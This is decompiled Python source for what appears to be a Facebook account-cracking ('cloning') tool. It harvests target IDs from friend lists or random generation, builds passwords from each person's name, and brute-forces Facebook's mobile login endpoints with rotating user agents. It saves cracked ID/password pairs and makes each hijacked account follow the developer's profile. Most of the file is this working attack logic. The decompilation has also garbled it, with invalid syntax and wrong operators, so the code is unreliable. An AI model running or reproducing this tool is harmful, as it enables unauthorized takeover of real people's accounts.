# Decompiled with Python Tools by Unnamed
# Internal filename: ___INNOCENT-BOY___
# Bytecode version: 3.11a7e (3495)

global loop  # inserted
global cp  # inserted
global ok  # inserted
W = '[97;1m'
R = '[91;1m'
G = '[92;1m'
Y = '[93;1m'
B = '[94;1m'
P = '[95;1m'
C = '[96;1m'
N = '[0m'
import os
try:
    import requests
except ImportError:
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures')
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests
import bs4
import uuid
import json
import os
import sys
import random
import datetime
import time
import re
import subprocess
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote
ugen2 = ['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser', 'Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen = ['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', '
id, id2, loop, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni = ([], [], 0, [], [], [], [], [], [], [], [])
cp = 0
ok = []
try:
    os.mkdir('/sdcard/')
except:
    pass
x = '[m'
k = '[93m'
h = '[1;92m'
hh = '[32m'
u = '[95m'
K = '[95m'
kk = '[33m'
b = '[1;96m'
p = '[0;34m'
dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'Agustus', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'Agustus', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = {'OK-' + str(tgl) + '-': str(bln) + '-' + str(thn) + '.txt'}
cpc = {'CP-' + str(tgl) + '-': str(bln) + '-' + str(thn) + '.txt'}

def clear():
    os.system('clear')

def back():
    login()
ah = 'TRICKER-'
imt = '-M4786=='
ak = ' SAJU-'
myid = uuid.uuid4().hex[:10].upper()
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.mrSAJU -cov', 'r').read()
except:
    kok = open('/data/data/com.termux/files/usr/bin/.mrSAJU -cov', 'w')
    kok.write(myid + imt)
    kok.close()

def login():
    try:
        token = open('.token.txt', 'r').read()
        tokenku.append(token)
            sy = requests.get(f'https://graph.facebook.com/me?access_token=' + tokenku[0])
            public_menu()
        except KeyError:
            Public()
            clear()
            print(logo)
            print(' [×] Connection Timeout')
            exit()
    else:  # inserted
        try:
            pass  # postinserted
        except requests.exceptions.ConnectionError:
            pass  # postinserted
    except IOError:
            Public()

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def Public():
    clear()
    print(logo)
    print(' [01] Login With Token\n [02] Login With Cookie')
    pil = input('\n [#] Select One : ')
    if pil in ['1', '01']:
        panda = input(' [+] Token : ')
        akun = open('.token.txt', 'w').write(panda)
        try:
            tes = requests.get('https://graph.facebook.com/me?access_token=' + panda)
            tes3 = json.loads(tes.text)['id']
            print(' [] Login Successful')
            login()
        except KeyError:
            print(' [×] Login Failed ')
            time.sleep(2.5)
            Public()
        except requests.exceptions.ConnectionError:
            print(' [×] Connection Timeout')
            exit()
    if pil in ['2', '02']:
        try:
            cookie = input(' [+] Cookie : ')
            data = requests.get('https://business.facebook.com/business_locations', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://www.facebook.com/', 'host': 'business.facebook.com', 'origin': 'https://business.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8', 'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
            find_token = re.search('(EAAG\\w+)', data.text)
            ken = open('.token.txt', 'w').write(find_token.group(1))
            print(' [] Login Successful')
            login()
        except Exception as e:
            os.system('rm -f .token.txt')
            print(' [×] Login Failed ')
            time.sleep(2.5)
            login()
            exit()

def public_menu():
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        exit()
    clear()
    print(logo)
    pil = input('\n [+] Enter ID Target : ')
    try:
        koh2 = requests.get(f'https://graph.facebook.com/v2.0/' * pil + f'?fields=friends.limit(5000)&access_token=' * tokenku[0]).json()
        for pi in koh2['friends']['data']:
            id.append(pi['id'] + '|' + pi['name'])
        print(f' [] Total : ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print(' [#] Connection Time Out')
        exit()
    except (KeyError, IOError):
        print(' [!] Not public Or Token Expire')
        exit()

def File():
    clear()
    print(logo)
    try:
        fileX = input('\n [+] Enter file path : ')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
    except IOError:
        exit('\n [!] file %s not found' % fileX)

def setting():
    hu = '2'
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    else:  # inserted
        if hu in ['2', '02']:
            muda = []
            for bacot in sorted(id):
                muda.append(bacot)
            bcm = len(muda)
            bcmi = bcm | 1
            for xmud in range(bcm):
                id2.append(muda[bcmi])
                bcmi = bcmi + 1
        else:  # inserted
            if hu in ['3', '03']:
                for bacot in id:
                    xx = random.randint(0, len(id2))
                    id2.insert(xx, bacot)
            else:  # inserted
                print(' [!] Choose Correct Option')
                exit()
    clear()
    print(logo)
    print('\n [01] Method 1 ')
    print(' [02] Method 2 [1;97m')
    hc = input('\n [#] method : ')
    if hc in ['1', '01']:
        method.append('mobile')
    else:  # inserted
        if hc in ['2', '02']:
            method.append('free')
        else:  # inserted
            method.append('mobile')
    passmenu()

def passmenu():
    clear()
    print(logo)
    print('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
    passmen = input('\n [#] Select Pass : ')
    if passmen in ['1', '01']:
        first()
    else:  # inserted
        if passmen in ['2', '02']:
            name()
        else:  # inserted
            if passmen in ['3', '03']:
                name2()
            else:  # inserted
                passmenu()

def first():
    clear()
    print(logo)
    print(' [!] [1;96mTurn Airplane Mode On/Off Every 5 Minutes[1;0m\n')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = (yuzong.split('|')[0], yuzong.split('|')[1].lower())
            frs = nmf.split(' ')[0]
            pwv = ['445566']
            if len(nmf) < 6:
                if len(frs) < 3:
                    break
                pwv.append(frs + '123')
                pwv.append(frs + '12345')
            else:  # inserted
                if len(frs) < 3:
                    pwv.append(nmf)
                else:  # inserted
                    pwv.append(nmf)
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            else:  # inserted
                if 'free' in method:
                    pool.submit(free, idf, pwv)
                else:  # inserted
                    pool.submit(crack, idf, pwv)

def name():
    clear()
    print(logo)
    print('\n [] OK Result Saved To : [1;92mOK/%s[1;97m\n [] CP Result Saved To : [1;91mCP/%s[1;97m\n [!] [1;96mTurn Airplane Mode On/Off Every 5 Minutes[1;0m\n' % (okc, cpc))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            try:
                idf, nmf = yuzong.split('|')
                xz = nmf.split(' ')
                if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or (len(xz) == 6):
                    pwv = [name, xz[0] * xz[0], xz[0] * xz[1], '12345', xz[0] * xz[1], '786', xz[0] * xz[1], '123', xz[0] * xz[1], '1234']
                else:  # inserted
                    pwv = [name, xz[0] * xz[0], xz[0] * xz[1], '12345', xz[0] * xz[1], '786', xz[0] * xz[1], '123', xz[0] * xz[1], '1234']
                if 'mobile' in method:
                    pool.submit(crack, idf, pwv)
                else:  # inserted
                    if 'free' in method:
                        pool.submit(free, idf, pwv)
                    else:  # inserted
                        pool.submit(crack, idf, pwv)
            except:
                continue

def name2():
    clear()
    print(logo)
    print('\n [] OK Result Saved To : [1;92mOK/%s[1;97m\n [] CP Result Saved To : [1;91mCP/%s[1;97m\n [!] [1;96mTurn Airplane Mode On/Off Every 5 Minutes[1;0m\n' % (okc, cpc))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = (yuzong.split('|')[0], yuzong.split('|')[1].lower())
            frs = nmf.split(' ')[0]
            pwv = ['445566']
            if len(nmf) < 6:
                if len(frs) < 3:
                    break
                pwv.append(frs + '123')
                pwv.append(frs + '12345')
            else:  # inserted
                if len(frs) < 3:
                    pwv.append(nmf)
                else:  # inserted
                    pwv.append(nmf)
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '786')
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            else:  # inserted
                if 'free' in method:
                    pool.submit(free, idf, pwv)
                else:  # inserted
                    pool.submit(crack, idf, pwv)

def crack(idf, pwv):
    global cp  # inserted
    global loop  # inserted
    bi = random.choice([u, k, kk, b, h, hh])
    pers = loop 5 * len(id2)
    fff = '%'
    (sys.stdout.write('\r %s[ SAJU ] %s•%s • OK:%s • CP:%s  ' % (bi, loop, len(id2), len(ok), cp)),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            pw = pw.lower()
            ses.headers.update({'Host': 'x.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'dpr': '3', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"', 'sec-ch-ua-full-version-list': '\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '\"\"', 'sec-ch-ua-platform': '\"Linux\"', 'sec-ch-ua-platform-version': '\"\"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', **{'user-agent': ua2, 'viewport-width': '980'}})
            p = ses.get('https://x.facebook.com/login/device-based/password/?uid=' * idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
            dataa = {'lsd': re.search('name=\"lsd\" value=\"(.*?)\"', str(p)).group(1), 'jazoest': re.search('name=\"jazoest\" value=\"(.*?)\"', str(p)).group(1), 'uid': idf, 'flow': 'login_no_pin', 'pass': pw, 'next': 'https://m.facebook.com/login/save-device/\''}
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': 'https://m.facebook.com', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/login/device-based/password/?uid=', 'accept-encoding': idf, 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                cp = cp 6 | 1
                print(f'\r[1;91m [ SAJU-CP ] {idf} | {pw}')
                open('CP/', cpc(), 'a').write(idf + '|' * pw + '\n')
                akun.append(idf + '|' + pw)
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = po.cookies.get_dict()
                coki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r[1;92m [ SAJU-OK ] {idf} | {pw}')
                wrt = '%s - %s' % (idf, pw)
                ok.append(wrt)
                open('/sdcard/ids/ok.txt', 'a').write('%s\n' % wrt)
                follow(ses, coki)
        except requests.exceptions.ConnectionError:
            else:  # inserted
                break
            else:  # inserted
                break
                time.sleep(31)
    loop = loop 6 | 1

def free(idf, pwv):
    global loop  # inserted
    bi = random.choice([u, k, kk, b, h, hh])
    pers = loop 5 * len(id2)
    fff = '%'
    (sys.stdout.write('\r %s[ SAJU] %s•%s • OK:%s • CP:%s  ' % (bi, loop, len(id2), len(ok), cp)),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            pw = pw.lower()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': ua2, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://mbasic.facebook.com/', 'accept-encoding': 'gzip, deflate br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
            p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid=' * idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
            dataa = {'lsd': re.search('name=\"lsd\" value=\"(.*?)\"', str(p)).group(1), 'jazoest': re.search('name=\"jazoest\" value=\"(.*?)\"', str(p)).group(1), 'uid': idf, 'flow': 'login_no_pin', 'pass': pw, 'next': 'https://mbasic.facebook.com/login/save-device/\''}
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': 'https://mbasic.facebook.com', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://mbasic.facebook.com/login/device-based/password/?uid=', 'accept-encoding': idf, 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                rint(f'\r[1;91m [ SAJU-CP ] {idf} | {pw}')
                open('CP/', cpc(), 'a').write(idf + '|' * pw + '\n')
                akun.append(idf + '|' + pw)
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = po.cookies.get_dict()
                coki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r[1;92m [ SAJU-OK ] {idf} | {pw}')
                wrt = '%s - %s' % (idf, pw)
                ok.append(wrt)
                open('/sdcard/SAJU-OK.txt', 'a').write('%s\n' % wrt)
                follow(ses, coki)
        except requests.exceptions.ConnectionError:
            else:  # inserted
                break
            else:  # inserted
                break
                time.sleep(31)
    loop = loop 6 | 1

def follow(ses, coki):
    ses.headers.update({'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(f'https://mbasic.facebook.com' + str(get), cookies={'cookie': coki}).text
logo = '[0;92m███████╗ [0;91m█████╗    [0;92m  ██╗[0;91m██╗   ██╗    [0;92m██╗  ██╗\n[0;92m██╔════╝[0;91m██╔══██╗  [0;92m   ██║[0;91m██║   ██║    [0;92m╚██╗██╔╝\n[0;92m███████╗[0;91m███████║   [0;92m  ██║[0;91m██║   ██║     [0;92m╚███╔╝ \n[0;92m╚════██║[0;91m██╔══██║[0;92m██   ██║[0;91m██║   ██║    [0;92m ██╔██╗ \n[0;92m███████║[0;91m██║  ██║[0;92m╚█████╔╝[0;91m╚██████ [0;92m╔╝██╗██╔╝ ██╗\n[0;92m╚══════╝[0;91m╚═╝  ╚═╝[0;92m ╚════╝  [0;91m╚═════╝  [0;92m╚═╝╚═╝  ╚═╝\n             \n[1;37m--------------------------------------------\n [1;31m[[1;32m•[1;31m][1;32m DEVELOPER :   [SAJU.x]\n [1;31m[[1;32m•[1;31m][1;32m TOOLS     :   [FILE & RANDOM COMING SON]\n [1;31m[[1;32m•[1;31m][1;32m GITHUB    :   [ARIYAN SAJU]\n [1;31m[[1;32m•[1;31m][1;32m VERSION   :   [0.1]\n [1;31m[[1;32m•[1;31m][1;32m WHATSAPP  :   +8801406687036\n[1;37m--------------------------------------------[1;32m'

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system('clear')
        print(logo)
        print('')
        print('[1;36m     UNFOLLOW KARNE WALON KA APROVEL URA DEYA JAIGA')
        print('')
        print('[1;32m [1] First You Follow my facebook')
        print('[1;33m [2] Exit')
        print('')
        SAJU = input('\n[1;36m  Chose ==> [1;32m')
        if SAJU in ['', ' ']:
            exit()
        else:  # inserted
            if SAJU in ['2', '02']:
                print('    Thanks🥰♥️')
                exit()
            else:  # inserted
                if SAJU in ['1', '01']:
                    os.system('xdg-open https://www.facebook.com/ariyan.saju.39')
                    print('')
                    time.sleep(2.0)
                    print('[1;33m    nam type kro')
                    print('')
                    input('\n[1;32m  Type Name ==> [1;36m')
                    time.sleep(2.1)
                    print('')
                    print('[1;32m Successful Bro')
                    time.sleep(2.0)
                    os.system('clear')
                    print(logo)
        print('\n[1;32m [1] File Cloning')
        print(' [2][1;33m Public Cloning')
        print(' [3][1;32m Create File')
        print(' [4][1;33m 2009-10 Cloning')
        print(' [5][1;32m 2011-14 Cloning')
        print(' [E][1;33m Exit \n')
        Ali = input(' Choose : ')
        if Ali in ['1', '01']:
            File()
        if Ali in ['2', '02']:
            Public()
        if Ali in ['3', '03']:
            os.system('python Dump.py')
        if Ali in ['4', '04']:
            self.old()
        if Ali in ['5', '05']:
            self.old2()
            exit()
        else:  # inserted
            print(' Select Correctly ')
            time.sleep(1)
            Main()

    def old(self):
        x = 111111111
        xx = 999999999
        idx = '100000'
        os.system('clear')
        print(logo)
        limit = int(input(' \n[0;95m[+][0;93m TOTAL IDS TO CRACK LIMIT 50,000: '))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print('[0;93m [+] TOTAL ID -> [0;91m%s[0;97m' + len(self.id))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print('\n[1;32m [!] USE (123456) FOR IDZ[1;37m ')
                listpass = input('%s [?] ENTER PASSWORD :%s ' % (G, Y))
                if len(listpass) <= 5:
                    exit('\n%s [!] PASSWORD MINIMUM 6 CHARACTERS' + B)
                print('%s [*] CRACK WITH PASSWORD -> [[0;91m%s[0;93m]' % (G, listpass))
                os.system('clear')
                print(logo)
                print('\n%s [+] OK RESULTS SAVED IN -> ok.txt' + Y)
                print('%s [+] CP RESULTS SAVED IN -> cp.txt' + G)
                print('%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS[0m\n' + P)
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(','))
                exit('\n\n [>>] CRACK COMPLETE...')
        except Exception as e:
                exit(str(e))

    def api(self, uid, pwx):
